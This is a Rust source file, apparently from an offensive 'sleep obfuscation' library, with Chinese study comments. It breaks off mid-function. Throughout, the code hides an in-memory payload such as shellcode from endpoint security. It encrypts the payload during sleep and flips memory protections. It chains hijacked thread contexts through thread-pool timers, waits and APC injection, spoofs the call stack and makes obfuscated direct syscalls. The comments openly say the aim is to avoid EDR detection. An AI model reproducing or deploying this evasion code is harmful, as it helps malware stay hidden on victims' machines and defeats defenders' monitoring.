use alloc::string::String;
use core::{ffi::c_void, mem::zeroed, ptr::null_mut};

use uwd::AsPointer;
use anyhow::{Result, bail};
use obfstr::{obfstr as obf, obfstring as s};
use dinvk::winapis::{
    NtCurrentProcess,
    NtCurrentThread,
    NT_SUCCESS
};
use dinvk::types::{
    LARGE_INTEGER, CONTEXT,
    EVENT_ALL_ACCESS, EVENT_TYPE, 
    NTSTATUS
};

use crate::{types::*, winapis::*};
use crate::config::{Config, init_config, current_rsp};
use crate::gadget::GadgetContext;
use crate::allocator::HypnusHeap;

/// Initiates execution obfuscation using the `TpSetTimer`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     timer!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! timer {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Timer, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Timer, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using the `TpSetWait`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     wait!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! wait {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Wait, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Wait, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using the `NtQueueApcThread`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     foliage!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! foliage {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Foliage, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Foliage, 
            $mode
        )
    };
}

/// Enumeration of supported memory obfuscation strategies.
pub enum Obfuscation {
    /// The technique using Windows thread pool (`TpSetTimer`).
    Timer,

    /// The technique using Windows thread pool (`TpSetWait`).
    Wait,

    /// The technique using APC (`NtQueueApcThread`).
    Foliage,
}

/// Represents bit-by-bit options for performing obfuscation in different modes
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(transparent)]
pub struct ObfMode(pub u32);

impl ObfMode {
    /// No additional obfuscation modes are used.
    /// 
    /// 0b0000:0b是二进制字面量标志;0000是u32的低4位,即这里只使用了低4位
    pub const None: Self = ObfMode(0b0000);

    /// Enables heap encryption.
    pub const Heap: Self = ObfMode(0b0001);

    /// Allows RWX protected memory regions.
    pub const Rwx: Self = ObfMode(0b0010);

    /// Checks whether the flag contains another `ObfMode`.
    /// 位与操作,这里因为只使用了低4位,所以重载了|操作符.如果self包含other所有位,self&other结果等于other本身;用于位计算
    fn contains(self, other: ObfMode) -> bool {
        (self.0 & other.0) == other.0
    }
}

/// 操作符 | 的重载
impl core::ops::BitOr for ObfMode {
    type Output = Self;

    /// Combines two `ObfMode` flags using bitwise OR.
    fn bitor(self, rhs: Self) -> Self::Output {
        // self.0是结构体内部u32数据
        // ObfMode::Heap | ObfMode::Rwx=ObfMode(ObfMode::Heap.0 | ObfMode::Rwx.0)
        ObfMode(self.0 | rhs.0)
    }
}

/// Structure responsible for centralizing memory obfuscation techniques
#[derive(Clone, Copy, Debug)]
struct Hypnus {
    /// Base memory pointer to be manipulated or operated on.
    base: u64,

    /// Size of the memory region.
    size: u64,

    /// Delay time in seconds.
    time: u64,

    /// Resolved WinAPI functions required for execution.
    cfg: &'static Config,

    /// Obfuscation modes.
    mode: ObfMode,
}

impl Hypnus {
    /// Creates a new `Hypnus`.
    #[inline]
    fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 || time == 0 {
            bail!(s!("invalid arguments"))
        }

        Ok(Self {
            base,
            size,
            time,
            mode,
            cfg: init_config()?,
        })
    }

    /// Performs memory obfuscation using a thread-pool timer sequence.
    fn timer(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            // 指定内存权限
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Initialize two synchronization events:创建两个anonymous内核事件对象,作为跨线程池同步的信号,用于控制寄存器快照\混淆链启动等关键阶段的先后执行顺序

            // 栈上预留三个数组位置(实际使用两个),用于接收从内核传回的事件句柄
            let mut events = [null_mut(); 3];
            for event in &mut events {
                let status = NtCreateEvent(
                    // 输出:内核创建成功的对象地址存放处
                    event,
                    //  
                    EVENT_ALL_ACCESS, 
                    // 对应原型函数参数objectattributes:传空代表该事件是anonymous的.EDR对有名事件在扫描全局对象目录时很容易发现.anonymous对象只存于当前进程句柄表,隐匿性最高
                    null_mut(), 
                    // 设置为有信号的通知型事件:会一直保持有信号状态,直到被重置(在hypnus的异步链中,一个事件可能被多个context同时等待,通知型事件能确保所有监听者都能收到信号)
                    EVENT_TYPE::NotificationEvent, 
                    // 对应原型参数InitialState.初始状态为无信号,意味这所有等待这些事件的线程都会立即进入挂起状态,直到后续指令再给他发信号
                    0
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("NtCreateEvent Failed"));
                }
            }

            // Allocate dedicated threadpool with one worker

            // 指向TP_POOL的句柄:是整个线程池的根,后续所有线程数量/栈大小都通过整个pool指针进行挂载
            let mut pool = null_mut();

            // 创建worker
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocPool Failed"));
            }

            // Configure threadpool stack sizes

            // 该线程池栈大小属性
            let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };

            // 应用/创建线程池
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                bail!(s!("TpSetPoolStackInformation Failed"));
            }

            // 将该线程池从并行/混乱的执行序列,设置为串行/可控的单线
            // 消除竞争
            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // Prepare callback environment
            // 回调函数的执行上下文,用于任务和指定pool池的绑定.确保混淆链条在构造的物理环境中运行.
            let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

            // Capture the current thread context

            // 用作定时器handle(TpSetTimer)
            let mut timer_ctx = null_mut();

            // CONTEXT_FULL,记录cpu全貌
            // win64下,P1Home-P6Home是shadow space.
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                // 这里仍处于impl Hypnus中,因此self为Hypnus结构体
                // rtl_capture_context=RtlCaptureContext
                P1Home: self.cfg.
                rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.要回调RtlCaptureContext,它的第一个参数对应的是线程池唤醒的rdx(即第二参数),所以需要trampoline将rdx移入rcx
            // 1.唤醒线程池(TpSetTimer)
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            // 在windows内存中注册一个定时器任务对象
            status = TpAllocTimer(
                // 输出参数,内核把新创建的的定时器对象TP_TIMER的物理内存地址填入
                &mut timer_ctx, 
                // 垫片(跳到这个地址执行)
                self.cfg.trampoline as *mut c_void, 
                // 堆栈上定义的CONTEXT
                &mut ctx_init as *mut _ as *mut c_void, 
                // 执行环境TP_CALLBACK_ENVIRON_V3
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocTimer [RtlCaptureContext] Failed"));
            }

            // LARGE_INTEGER win特有的64位的union:用于表示超大整数.是win处理系统事件/性能计数的唯一标准
            // core::mem::zero,将该64位内存全部刷为0,防止被之前脏数据干扰
            let mut delay = zeroed::<LARGE_INTEGER>();

            // win内核的时间精度是100纳秒(1ms毫秒=1000us微秒;1us=10*100纳秒).1ms=10000个100纳秒单位.即100i64 * 10_000表示100ms
            // win下,正数代表绝对时间,从1601年1月1日起算的总刻度;负数代表相对时间,从现在起算.
            // 这里代表100ms后执行
            delay.QuadPart = -(100i64 * 10_000);

            // 唤醒线程
            TpSetTimer(
                // 输出参数,在调用TpSetTimer前,已经被TpAllocTimer填入
                timer_ctx, 
                // 唤醒时刻
                &mut delay, 
                // 周期msperiod,0代表是one-shot单次触发任务;
                0, 
                // msWindowLength - 时间窗口:允许系统延迟执行的宽限期.0代表只要倒计时一归零，必须立刻发送唤醒信号(实际执行中受硬件时钟终端频率限制(一般15.6ms),除非使用timeBeginPeriod修改系统时钟频率)
                0);

            // Signal after RtlCaptureContext finishes
            // 初始化新定时器对象TP_TIMER槽位.这里负责发送完成的信号
            let mut timer_event = null_mut();
            //
            status = TpAllocTimer(
                // 第二个定时器handle
                &mut timer_event,

                // win api:将事件对象从无信号转为有信号 
                // 如何从外部链接到本项目的?
                NtSetEvent2 as *mut c_void,

                //  函数开头创建的第一个事件handle
                // 1. events[0]->TpAllocTimer;2. 定时器触发-> events[0] 被塞进 CPU 的 RDX 寄存器;3. NtSetEvent2 被调用 -> 它用 RDX中的handle,去内核
                events[0], 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocTimer [NtSetEvent] Failed"));
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetTimer(timer_event, &mut delay, 0, 0);
            // 以上,设置两个定时器.因为RtlCaptureContext快照后,直接返回,线程继续休眠.第二个定时器设为200ms,去点亮events[0]


            // Wait for context capture to complete
            // 将当前线程陷入休眠,直到指定信号出现
            status = NtWaitForSingleObject(
                // 等待的对象
                events[0],
                // 是否可被其他中断唤醒
                0, 
                // 等待时常
                null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtWaitForSingleObject Failed"));
            }

            // Build multi-step spoofed CONTEXT chain
            // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
            let mut ctxs = [ctx_init; 10];

            // 将10个ctx_init的rax设为Ntcontinue;且栈变小
            for ctx in &mut ctxs {
                // 将context中rax设为NtContinue的地址(ntdll中的api).
                // NtContinue接收一个context,强迫cpu变成context描述的状态
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate thread handle for context manipulation
            let mut h_thread = null_mut();

            // NtDuplicateObject,内核提供的handle克隆api.在内核句柄表(handle table)中,创建新索引条目,该条目指向一个存在的内核对象.可以跨进程克隆句柄,可以在同一进程中将受限/临时的句柄转为永久/有完全访问权限的实体句柄
            // 其核心功能是将源进程表中的一个对象句柄索引，在目标进程（或同进程）的句柄表中创建一个新的有效条目，并根据权限掩码（ACCESS_MASK）赋予其相应的访问能力
            // 在该项目中，此函数的作用是将当前线程的“伪句柄（Pseudo-handle）”转换为具备完整访问权限的“真实内核对象句柄”，从而为后续进行 APC注入和上下文操作提供合法且高权限的访问载体
            status = NtDuplicateObject(
                // 源进程
                NtCurrentProcess(),
                // 源对象
                NtCurrentThread(),
                // 目标进程
                NtCurrentProcess(),
                // 目标对象
                &mut h_thread,
                // 期望权限
                0,
                // 句柄属性
                0,
                // 复刻源的所有权利
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();

            // ctx_init是payload.spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链
            // EDR回溯的起点是rsp指向的栈槽位,即使rip里是payload地址,也不影响伪造栈.即,这里从payload之后开始一直伪装到回溯的根部
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            // 将该伪造栈帧的 RIP 设置为系统函数NtWaitForSingleObject 的地址。即当该栈帧被“加载”到 CPU时，它就像是一个系统调用
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[1] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporary RW access
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypt region
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Backup context
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Inject spoofed context
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep
            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
            ctxs[5].Rcx = h_thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8  = 0;

            // Decrypt region
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restore protection
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restore thread context
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[8].Rcx = h_thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Final event notification
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
            ctxs[9].Rcx = events[2] as u64;
            ctxs[9].Rdx = 0;

            // Layout spoofed CONTEXT chain on stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Timer)?;

            // Patch old_protect into expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Schedule each CONTEXT via TpSetTimer
            for ctx in &mut ctxs {
                let mut timer = null_mut();
                status = TpAllocTimer(
                    &mut timer, 
                    self.cfg.callback as *mut c_void, 
                    ctx as *mut _ as *mut c_void, 
                    &mut env
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("TpAllocTimer Failed"));
                }

                // Add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetTimer(timer, &mut delay, 0, 0);
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait for chain completion
            status = NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // Undo heap encryption
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

    /// Performs memory obfuscation using a thread-pool wait–based strategy.
    ///
    /// This strategy is similar to [`Hypnus::timer`], but uses `TpSetWait`
    /// instead of `TpSetTimer` to drive the spoofed CONTEXT chain.
    fn wait(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Events used to synchronize context capture and chain completion
            let mut events = [null_mut(); 4];
            for event in &mut events {
                let status = NtCreateEvent(
                    event, 
                    EVENT_ALL_ACCESS, 
                    null_mut(), 
                    EVENT_TYPE::NotificationEvent, 
                    0
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("NtCreateEvent Failed"));
                }
            }

            // Allocate dedicated threadpool with one worker
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocPool Failed"));
            }

            // Configure threadpool stack sizes
            let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                bail!(s!("TpSetPoolStackInformation Failed"));
            }

            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // Prepare callback environment
            let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

            // Capture the current thread context
            let mut wait_ctx = null_mut();
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocWait(
                &mut wait_ctx, 
                self.cfg.trampoline as *mut c_void, 
                &mut ctx_init as *mut _ as *mut c_void, 
                &mut env
            );

            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocWait [RtlCaptureContext] Failed"));
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            TpSetWait(wait_ctx, events[0], &mut delay);

            // Signal after RtlCaptureContext finishes
            let mut wait_event = null_mut();
            status = TpAllocWait(
                &mut wait_event, 
                NtSetEvent2 as *mut c_void, 
                events[1], 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocWait [NtSetEvent] Failed"));
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetWait(wait_event, events[0], &mut delay);

            // Wait for context capture to complete
            status = NtWaitForSingleObject(events[1], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtWaitForSingleObject Failed"));
            }

            // Build multi-step spoofed CONTEXT chain
            let mut ctxs = [ctx_init; 10];
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate thread handle for context manipulation
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[2] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporary RW access
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypt region
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Backup context
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Inject spoofed context
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep
            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
            ctxs[5].Rcx = h_thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8  = 0;

            // Decrypt region
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restore protection
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restore thread context
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[8].Rcx = h_thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Final event notification
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
            ctxs[9].Rcx = events[3] as u64;
            ctxs[9].Rdx = 0;

            // Layout spoofed CONTEXT chain on stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Wait)?;

            // Patch old_protect into expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Schedule each CONTEXT via TpAllocWait
            for ctx in &mut ctxs {
                let mut wait = null_mut();
                status = TpAllocWait(
                    &mut wait, 
                    self.cfg.callback as *mut c_void, 
                    ctx as *mut _ as *mut c_void, 
                    &mut env
                );

                if !NT_SUCCESS(status) {
                    bail!(s!("TpAllocWait Failed"));
                }

                // Add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetWait(wait, events[0], &mut delay);
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait for chain completion
            status = NtSignalAndWaitForSingleObject(events[2], events[3], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

    /// Performs memory obfuscation using APC injection and hijacked thread contexts.
    fn foliage(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Create a manual-reset synchronization event to be signaled after execution
            let mut event = null_mut();
            let mut status = NtCreateEvent(
                &mut event, 
                EVENT_ALL_ACCESS, 
                null_mut(), 
                EVENT_TYPE::SynchronizationEvent, 
                0
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtCreateEvent Failed"));
            }

            // Create a new thread in suspended state for APC injection
            let mut h_thread = null_mut::<c_void>();
            status = uwd::syscall!(
                obf!("NtCreateThreadEx"),
                h_thread.as_ptr_mut(),
                THREAD_ALL_ACCESS,
                null_mut::<c_void>(),
                NtCurrentProcess(),
                (self.cfg.tp_release_cleanup.as_ptr()).add(0x250),
                null_mut::<c_void>(),
                1,
                0,
                0x1000 * 20,
                0x1000 * 20,
                null_mut::<c_void>()
            )? as NTSTATUS;

            if !NT_SUCCESS(status) {
                bail!(s!("NtCreateThreadEx Failed"));
            }

            // Get the initial context of the suspended thread
            let mut ctx_init = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            status = uwd::syscall!(obf!("NtGetContextThread"), h_thread, ctx_init.as_ptr_mut())? as NTSTATUS;
            if !NT_SUCCESS(status) {
                bail!(s!("NtGetContextThread Failed"));
            }

            // Clone the base context 10 times for the full spoofed execution chain
            let mut ctxs = [ctx_init; 10];

            // Duplicate the current thread handle
            let mut thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Preparing for call stack spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
            ctxs[0].Rcx = event as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporarily makes the target memory region writable before encryption
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypts or masks the specified memory region
            ctxs[2].Rip = self.cfg.system_function040.into();
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Saves the original CONTEXT so it can be restored later
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].Rip = self.cfg.nt_get_context_thread.into();
            ctxs[3].Rcx = thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
            ctxs[4].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[4].Rcx = thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep primitive using the current thread handle and a delay
            ctxs[5].Rip = self.cfg.wait_for_single.into();
            ctxs[5].Rcx = thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8  = 0;

            // Decrypts (unmasks) the memory after waking up
            ctxs[6].Rip = self.cfg.system_function041.into();
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restores the memory protection after decryption.
            ctxs[7].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restores the original thread context
            ctxs[8].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[8].Rcx = thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Gracefully terminates the helper thread after all steps are complete.
            ctxs[9].Rip = self.cfg.rtl_exit_user_thread.into();
            ctxs[9].Rcx = h_thread as u64;
            ctxs[9].Rdx = 0;

            // Layout the entire spoofed CONTEXT chain on the stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Foliage)?;

            // Write `old_protect` values into the expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Queue each CONTEXT as an APC to be executed in sequence
            for ctx in &mut ctxs {
                status = NtQueueApcThread(
                    h_thread,
                    self.cfg.nt_continue.as_ptr().cast_mut(),
                    ctx as *mut _ as *mut c_void,
                    null_mut(),
                    null_mut(),
                );

                if !NT_SUCCESS(status) {
